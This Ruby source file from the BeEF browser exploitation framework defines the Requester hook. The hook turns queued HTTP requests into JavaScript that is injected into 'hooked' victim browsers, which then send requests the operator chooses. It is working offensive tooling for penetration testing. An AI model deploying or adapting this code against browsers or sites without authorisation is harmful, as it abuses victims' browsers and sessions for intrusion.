#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
module BeEF
  module Extension
    module Requester
      module API

        require 'uri'
        class Hook

          include BeEF::Core::Handlers::Modules::BeEFJS

          # If the HTTP table contains requests that need to be sent (has_ran = waiting), retrieve
          # and send them to the hooked browser.
          def requester_run(hb, body)
            @body = body
            # Generate all the requests and output them to the hooked browser
            output = []
            BeEF::Core::Models::Http.all(:hooked_browser_id => hb.id, :has_ran => "waiting").each { |h|
              output << self.requester_parse_db_request(h)
            }

            return if output.empty?

            # Build the BeEFJS requester component
            build_missing_beefjs_components 'beef.net.requester'

            # Send the command to perform the requests to the hooked browser
            @body << %Q{
              beef.execute(function() {
                beef.net.requester.send(
                  #{output.to_json}
                );
              });
            }
          end

          #
          # Converts an HTTP db object into an Hash that follows the representation
          # of input data for the beef.net.request Javascript API function.
          # The Hash will then be converted into JSON, given as input to beef.net.requester.send Javascript API function
          # and finally sent to and executed by the hooked browser.
          def requester_parse_db_request(http_db_object)

            # We're overwriting the URI::Parser UNRESERVED regex to prevent BAD URI errors when sending attack vectors (see tolerant_parser)
            tolerant_parser = URI::Parser.new(:UNRESERVED => BeEF::Core::Configuration.instance.get("beef.extension.requester.uri_unreserved_chars"))
            req = WEBrick::HTTPRequest.new(WEBrick::Config::HTTP)
            params = nil

            begin
              s = StringIO.new http_db_object.request
              req.parse(s)
            rescue Exception => e
              puts e.message
              puts e.backtrace
              return
            end

            http_request_object = nil
            uri = req.unparsed_uri
            if not req['content-length'].nil? and req.content_length > 0
              # POST request
              params = []
              # if the content length is invalid, webrick crashes. Hence we try to catch any exception
              # here and continue execution.
              begin
                req.query.keys.each { |k| params << "#{k}=#{req.query[k]}" }
                params = params.join '&'
              rescue Exception => e
                puts e.message
                puts e.backtrace
                return
              end
              # creating the request object
              http_request_object = {
                  'id' => http_db_object.id,
                  'method' => req.request_method,
                  'host' => req.host,
                  'port' => req.port,
                  'params' => params,
                  'uri' => tolerant_parser.parse(uri).path,
                  'headers' => {}
              }
            else
              #non-POST request (ex. GET): query parameters in URL need to be parsed and added to the URI
              query_params = tolerant_parser.split(uri)[7]
              if not query_params.nil?
                req_uri = tolerant_parser.parse(uri).path + "?" + query_params
              else
                req_uri = tolerant_parser.parse(uri).path
              end
              # creating the request object
              http_request_object = {
                  'id' => http_db_object.id,
                  'method' => req.request_method,
                  'host' => req.host,
                  'port' => req.port,
                  'params' => params,
                  'uri' => req_uri,
                  'headers' => {}
              }
            end
            req.header.keys.each { |key| http_request_object['headers'][key] = req.header[key] }

            http_request_object
          end
        end
      end
    end
  end
end
